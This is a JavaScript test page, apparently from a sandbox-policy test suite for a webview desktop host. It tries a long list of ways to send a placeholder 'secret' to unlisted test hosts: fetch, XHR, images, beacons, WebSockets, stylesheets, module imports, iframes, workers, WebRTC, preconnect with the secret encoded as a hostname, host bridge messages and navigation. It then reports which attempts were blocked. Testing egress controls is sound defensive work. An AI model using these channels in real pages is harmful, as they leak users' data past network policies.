// Every way out the page tries, each reported as it settles: "sent" when the browser let it go, "refused" when it didn't.
// Whether it reached a site is counted by the sites themselves, never by what the page thinks.
(async () => {
  const q = new URLSearchParams(location.search);
  const listed = q.get('listed'), unlisted = q.get('unlisted'), alias = q.get('alias');
  const results = {};
  const attempt = async (name, fn) => {
    const late = new Promise((r) => setTimeout(() => r('no answer'), 3000));
    try { results[name] = (await Promise.race([Promise.resolve().then(fn), late])) || 'sent'; } catch (error) { results[name] = 'refused'; }
  };
  const settle = (ms) => new Promise((r) => setTimeout(r, ms));

  await attempt('listed fetch', async () => { const r = await fetch(listed + '/weather'); return r.ok ? 'sent' : 'refused'; });
  await attempt('unlisted fetch', () => fetch(unlisted + '/fetch?d=secret', { mode: 'no-cors' }).then(() => 'sent'));
  await attempt('alias fetch', () => fetch(alias + '/alias?d=secret', { mode: 'no-cors' }).then(() => 'sent'));
  await attempt('xhr', () => new Promise((ok, no) => {
    const x = new XMLHttpRequest(); x.open('GET', unlisted + '/xhr?d=secret'); x.onload = () => ok('sent'); x.onerror = () => no(); x.send();
  }));
  await attempt('image', () => new Promise((ok, no) => { const i = new Image(); i.onload = () => ok('sent'); i.onerror = () => no(); i.src = unlisted + '/img?d=secret'; }));
  await attempt('beacon', () => (navigator.sendBeacon(unlisted + '/beacon', 'secret') ? 'sent' : 'refused'));
  await attempt('websocket', () => new Promise((ok, no) => {
    const s = new WebSocket(unlisted.replace('http', 'ws') + '/ws?d=secret'); s.onopen = () => ok('sent'); s.onerror = () => no();
  }));
  await attempt('stylesheet', () => new Promise((ok, no) => {
    const l = document.createElement('link'); l.rel = 'stylesheet'; l.href = unlisted + '/css?d=secret'; l.onload = () => ok('sent'); l.onerror = () => no(); document.head.append(l);
  }));
  await attempt('module', () => import(unlisted + '/module.js?d=secret').then(() => 'sent'));
  await attempt('frame', () => new Promise((ok) => {
    const f = document.createElement('iframe'); f.src = unlisted + '/frame?d=secret'; document.documentElement.append(f); setTimeout(() => ok('tried'), 800);
  }));
  await attempt('worker', () => new Promise((ok, no) => {
    const w = new Worker('worker.js'); w.onmessage = (e) => (e.data === 'sent' ? ok('sent') : no()); w.onerror = () => no(); w.postMessage(unlisted);
  }));
  await attempt('webrtc', () => {
    const pc = new RTCPeerConnection({ iceServers: [{ urls: 'stun:' + new URL(unlisted).host }] });
    pc.createDataChannel('d'); return pc.createOffer().then((o) => pc.setLocalDescription(o)).then(() => 'sent');
  });
  // A connection opened ahead of any request, which neither the policy nor a look at requests sees: to the site, and to
  // a name that carries the secret (a .localhost name is this Mac's loopback, standing in for a lookup of it).
  await attempt('preconnect', () => {
    for (const href of [unlisted + '/', unlisted.replace('127.0.0.1', 'c2VjcmV0.localhost') + '/']) {
      const l = document.createElement('link'); l.rel = 'preconnect'; l.href = href; document.head.append(l);
    }
    return 'tried';
  });
  // The host's bridges, which a page reaches through chrome.webview as lamp.js does.
  const bridge = window.chrome && window.chrome.webview;
  if (bridge) {
    bridge.postMessage({ lamp: 'http', id: 1, url: unlisted + '/ai/chat', body: '{"d":"secret"}' });
    bridge.postMessage({ lamp: 'ws', op: 'open', id: 2, url: unlisted.replace('http', 'ws') + '/' });
  }
  await settle(800);
  await fetch('/__result', { method: 'POST', body: JSON.stringify(results) });
  // Last, leaving for the unlisted site with what it holds in the address.
  location.href = unlisted + '/navigate?d=secret';
})();
